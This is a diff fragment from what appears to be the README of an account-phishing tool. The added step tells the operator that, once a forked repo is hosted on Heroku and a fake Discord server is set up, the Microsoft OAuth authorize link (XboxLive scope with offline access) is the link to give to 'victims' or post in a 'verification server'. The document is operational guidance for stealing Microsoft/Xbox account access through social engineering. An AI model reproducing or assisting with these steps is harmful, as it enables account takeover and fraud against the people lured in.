@@ -20,3 +20,4 @@
             
 4. Host the repo you forked on heroku  
 5. Set up your fake discord server  
+6. Now you're done, the link you're going to be giving to your victims or putting in your verification server is "https://login.live.com/oauth20_authorize.srf?client_id=CLIENT-ID&response_type=code&redirect_uri=REDIRECT-URI&scope=XboxLive.signin+offline_access&state=NOT_NEEDED" (REPLACE CLIENT-ID and REDIRECT-URI)!!!!!
